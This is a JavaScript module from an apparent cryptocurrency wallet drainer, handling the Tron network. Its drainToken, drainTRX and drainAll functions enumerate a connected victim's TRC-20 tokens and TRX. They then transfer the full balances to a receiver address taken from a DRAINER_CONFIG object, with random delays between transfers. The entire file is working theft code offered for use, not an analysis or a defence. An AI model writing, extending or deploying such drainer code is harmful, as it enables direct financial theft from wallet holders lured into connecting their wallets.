// Tron Network Handler
class TronNetwork {
    constructor() {
        this.tronWeb = null;
        this.networkConfig = window.DRAINER_CONFIG.NETWORKS.tron;
        this.tokens = window.DRAINER_CONFIG.TOKENS.tron;
        this.receiverAddress = window.DRAINER_CONFIG.RECEIVER_ADDRESSES.tron;
    }

    async initialize(tronWebInstance) {
        try {
            if (window.tronWeb && window.tronWeb.ready) {
                this.tronWeb = window.tronWeb;
            } else if (tronWebInstance) {
                this.tronWeb = tronWebInstance;
            } else {
                // Fallback: create TronWeb instance
                this.tronWeb = new TronWeb({
                    fullHost: this.networkConfig.fullHost,
                    solidityNode: this.networkConfig.solidityNode,
                    eventServer: this.networkConfig.eventServer
                });
            }

            // Test connection
            const nodeInfo = await this.tronWeb.trx.getNodeInfo();
            console.log('Connected to Tron network:', nodeInfo);
            
            return true;
        } catch (error) {
            console.error('Failed to initialize Tron network:', error);
            return false;
        }
    }

    async getBalance(address) {
        try {
            const balance = await this.tronWeb.trx.getBalance(address);
            return {
                raw: balance,
                formatted: (balance / 1000000).toFixed(6), // TRX has 6 decimals
                symbol: 'TRX'
            };
        } catch (error) {
            console.error('Failed to get TRX balance:', error);
            return null;
        }
    }

    async getTokenBalance(address, token) {
        try {
            const contract = await this.tronWeb.contract().at(token.address);
            const balance = await contract.balanceOf(address).call();
            
            if (!balance || balance.toString() === '0') {
                return null;
            }

            const balanceFormatted = this.tronWeb.toBigNumber(balance).dividedBy(Math.pow(10, token.decimals));

            return {
                raw: balance,
                formatted: balanceFormatted.toFixed(6),
                symbol: token.symbol,
                contractAddress: token.address,
                decimals: token.decimals
            };
        } catch (error) {
            console.error(`Failed to get ${token.symbol} balance:`, error);
            return null;
        }
    }

    async getAllTokenBalances(address) {
        const balances = [];
        
        for (const token of this.tokens) {
            try {
                const balance = await this.getTokenBalance(address, token);
                if (balance) {
                    balances.push(balance);
                }
            } catch (error) {
                console.warn(`Skipping ${token.symbol}:`, error.message);
            }
        }
        
        return balances;
    }

    async estimateEnergy(transaction) {
        try {
            const estimate = await this.tronWeb.transactionBuilder.estimateEnergy(
                transaction.to,
                transaction.functionSelector,
                transaction.options,
                transaction.parameters,
                transaction.issuerAddress
            );
            return estimate;
        } catch (error) {
            console.error('Energy estimation failed:', error);
            return 100000; // Fallback energy limit
        }
    }

    async drainToken(userAddress, token) {
        try {
            const contract = await this.tronWeb.contract().at(token.address);
            const balance = await contract.balanceOf(userAddress).call();

            if (!balance || balance.toString() === '0') {
                return { success: false, message: `No ${token.symbol} balance` };
            }

            // Check if user has enough TRX for energy/bandwidth
            const trxBalance = await this.tronWeb.trx.getBalance(userAddress);
            if (trxBalance < 1000000) { // Less than 1 TRX
                return { 
                    success: false, 
                    message: `Insufficient TRX for transaction fees. Need at least 1 TRX` 
                };
            }

            // Create transfer transaction
            const transaction = await contract.transfer(this.receiverAddress, balance).send({
                feeLimit: 100000000, // 100 TRX fee limit
                callValue: 0,
                shouldPollResponse: true
            });

            if (transaction && transaction.txid) {
                const balanceFormatted = this.tronWeb.toBigNumber(balance)
                    .dividedBy(Math.pow(10, token.decimals))
                    .toFixed(6);

                return {
                    success: true,
                    txid: transaction.txid,
                    amount: balanceFormatted,
                    symbol: token.symbol,
                    explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/transaction/${transaction.txid}`
                };
            } else {
                return { success: false, message: `Failed to send ${token.symbol} transaction` };
            }

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainTRX(userAddress) {
        try {
            const balance = await this.tronWeb.trx.getBalance(userAddress);
            
            if (balance === 0) {
                return { success: false, message: "No TRX balance" };
            }

            // Reserve some TRX for transaction fees (1 TRX = 1,000,000 sun)
            const feeReserve = 1000000; // 1 TRX
            const amountToSend = balance - feeReserve;

            if (amountToSend <= 0) {
                return { 
                    success: false, 
                    message: "Insufficient TRX balance for transaction fees" 
                };
            }

            // Create transfer transaction
            const transaction = await this.tronWeb.transactionBuilder.sendTrx(
                this.receiverAddress,
                amountToSend,
                userAddress
            );

            // Sign transaction
            const signedTransaction = await this.tronWeb.trx.sign(transaction);
            
            // Broadcast transaction
            const result = await this.tronWeb.trx.sendRawTransaction(signedTransaction);

            if (result.result) {
                return {
                    success: true,
                    txid: result.txid,
                    amount: (amountToSend / 1000000).toFixed(6),
                    symbol: 'TRX',
                    explorerUrl: `${this.networkConfig.blockExplorerUrls[0]}/transaction/${result.txid}`
                };
            } else {
                return { 
                    success: false, 
                    message: result.message || "Transaction failed" 
                };
            }

        } catch (error) {
            return {
                success: false,
                message: error.message,
                code: error.code
            };
        }
    }

    async drainAll(userAddress, progressCallback) {
        const results = [];
        let completed = 0;
        
        try {
            // Get all balances first
            const tokenBalances = await this.getAllTokenBalances(userAddress);
            const trxBalance = await this.getBalance(userAddress);
            
            const totalOperations = tokenBalances.length + (trxBalance ? 1 : 0);
            
            if (totalOperations === 0) {
                return { success: false, message: "No assets to drain" };
            }

            // Drain TRC-20 tokens first
            for (const tokenBalance of tokenBalances) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, `Draining ${tokenBalance.symbol}...`);
                }

                const result = await this.drainToken(userAddress, {
                    address: tokenBalance.contractAddress,
                    symbol: tokenBalance.symbol,
                    decimals: tokenBalance.decimals
                });

                results.push({
                    type: 'token',
                    network: 'tron',
                    ...result
                });

                completed++;
                await window.DRAINER_UTILS.sleep(window.DRAINER_UTILS.generateRandomDelay(2000, 4000));
            }

            // Drain TRX last
            if (trxBalance && parseFloat(trxBalance.formatted) > 1) {
                if (progressCallback) {
                    progressCallback((completed / totalOperations) * 100, "Draining TRX...");
                }

                const result = await this.drainTRX(userAddress);
                results.push({
                    type: 'native',
                    network: 'tron',
                    ...result
                });
                completed++;
            }

            if (progressCallback) {
                progressCallback(100, "Tron drainage complete!");
            }

            return {
                success: true,
                results,
                summary: {
                    totalOperations,
                    successful: results.filter(r => r.success).length,
                    failed: results.filter(r => !r.success).length
                }
            };

        } catch (error) {
            return {
                success: false,
                message: error.message,
                results
            };
        }
    }

    // Tron-specific utility functions
    async getAccountResources(address) {
        try {
            const resources = await this.tronWeb.trx.getAccountResources(address);
            return {
                bandwidth: resources.freeNetUsed || 0,
                energy: resources.EnergyUsed || 0,
                tronPowerUsed: resources.tronPowerUsed || 0
            };
        } catch (error) {
            console.error('Failed to get account resources:', error);
            return null;
        }
    }

    async getTRC20TokenInfo(contractAddress) {
        try {
            const contract = await this.tronWeb.contract().at(contractAddress);
            const [name, symbol, decimals] = await Promise.all([
                contract.name().call(),
                contract.symbol().call(),
                contract.decimals().call()
            ]);
            
            return {
                name: this.tronWeb.toUtf8(name),
                symbol: this.tronWeb.toUtf8(symbol),
                decimals: parseInt(decimals)
            };
        } catch (error) {
            console.error('Failed to get token info:', error);
            return null;
        }
    }

    async waitForConfirmation(txid, maxAttempts = 30) {
        for (let i = 0; i < maxAttempts; i++) {
            try {
                const transaction = await this.tronWeb.trx.getTransactionInfo(txid);
                if (transaction && transaction.receipt) {
                    return transaction;
                }
            } catch (error) {
                // Transaction not found yet, continue waiting
            }
            
            await window.DRAINER_UTILS.sleep(2000); // Wait 2 seconds
        }
        
        throw new Error('Transaction confirmation timeout');
    }
}

// Export for use in other modules
window.TronNetwork = TronNetwork;
